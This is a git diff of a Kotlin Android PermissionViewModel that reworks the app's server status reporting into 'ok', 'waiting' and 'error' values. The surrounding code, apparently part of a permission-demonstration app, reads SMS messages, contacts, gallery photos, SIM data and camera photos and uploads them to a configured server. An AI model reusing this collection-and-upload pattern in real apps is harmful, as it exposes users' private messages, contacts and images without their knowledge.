@@ -32,9 +32,12 @@ class PermissionViewModel(application: Application) : AndroidViewModel(applicati
         val permissionText: String
     )
 
-    var firstTime:Boolean = true
-    private var _successServerCommunication = MutableLiveData<Boolean>()
-    val successServerCommunication: LiveData<Boolean> = _successServerCommunication
+    private var _successServerCommunication = MutableLiveData<String>()
+    val successServerCommunication: LiveData<String> = _successServerCommunication
+
+    private val ok = "ok"
+    private val waiting = "waiting"
+    private val error = "error"
 
 
     // ID of permission
@@ -161,33 +164,30 @@ class PermissionViewModel(application: Application) : AndroidViewModel(applicati
      * @param context Application context.
      */
     fun sendDataToServer(activity: Activity, context: Context) {
-        firstTime = false
-        Log.d("test","sendDataToServer")
+        _successServerCommunication.value = waiting
+        Log.d("test", "sendDataToServer")
         Log.d("test", "dataIsSend$dataIsSend")
         comFun.testConnectionToServer(SettingsSharedPreferences(context).getIpSettings(),
             object : CommunicationService.VolleyStringResponse {
                 override fun onSuccess() {
-                    firstTime = true
                     Log.d("test", "dataIsSend$dataIsSend")
                     if (!dataIsSend) {
                         createUserInServer(activity, context)
-                        Log.d("test","Go To createUserInServer")
-                    }
-                    else {
-                        _successServerCommunication.value = true
-                        firstTime = true
+                        Log.d("test", "Go To createUserInServer")
+                    } else {
+                        _successServerCommunication.value = ok
                     }
                 }
+
                 override fun onError() {
-                    firstTime = true
-                    _successServerCommunication.value = false
+                    _successServerCommunication.value = error
 
                 }
             })
     }
 
-    fun createUserInServer(activity: Activity, context: Context) {
-        Log.d("test","createUserInServer")
+    private fun createUserInServer(activity: Activity, context: Context) {
+        Log.d("test", "createUserInServer")
         if (userCreatedInServer) {
             createPermissionTableInServer(activity, context)
         } else {
@@ -197,15 +197,16 @@ class PermissionViewModel(application: Application) : AndroidViewModel(applicati
                         createPermissionTableInServer(activity, context)
                         userCreatedInServer = true
                     }
+
                     override fun onError() {
-                        _successServerCommunication.value = false
+                        _successServerCommunication.value = error
                     }
                 })
         }
     }
 
-    fun createPermissionTableInServer(activity: Activity, context: Context) {
-        Log.d("test","createPermissionTableInServer")
+    private fun createPermissionTableInServer(activity: Activity, context: Context) {
+        Log.d("test", "createPermissionTableInServer")
         comFun.createPermissionTableInServer(
             permissionFun.getPermissionTypeFromPermissionID(
                 permissionId
@@ -215,7 +216,7 @@ class PermissionViewModel(application: Application) : AndroidViewModel(applicati
                 }
 
                 override fun onError() {
-                    _successServerCommunication.value = false
+                    _successServerCommunication.value = error
                 }
 
             })
@@ -225,7 +226,8 @@ class PermissionViewModel(application: Application) : AndroidViewModel(applicati
      * Send permission data to server based on permission ID.
      */
     private fun sendPermissionDataToServer(activity: Activity, context: Context) {
-        Log.d("test","sendPermissionDataToServer")
+        Log.d("test", "sendPermissionDataToServer")
+        dataIsSend = true
         when (permissionId) {
             1 -> comFun.addSMStoServer(SmsFunction().readSms(10, activity.contentResolver, context))
             2 -> comFun.addContactToServer(
@@ -253,14 +255,17 @@ class PermissionViewModel(application: Application) : AndroidViewModel(applicati
                 StorageFunction().getPhotosFromGallery(activity.contentResolver, 10)
             )
             7 -> comFun.addPhoneStateToServer(PhoneStateFunction().getDataFromSIM(context))
-            8 -> comFun.addCameraPhotoToServer(photo)
+            8 -> dataIsSend = false
         }
-        _successServerCommunication.value = true
-        dataIsSend = true
+        _successServerCommunication.value = ok
+
     }
 
-    fun sendPhotoToServer(photo: Bitmap) {
-        comFun.addCameraPhotoToServer(photo)
+    fun sendPermissionDataToServer(cameraPhoto: Bitmap) {
+        Log.d("test", "sendPermissionDataToServer")
+        comFun.addCameraPhotoToServer(cameraPhoto)
+        _successServerCommunication.value = ok
+        dataIsSend = true
     }
 
     /**
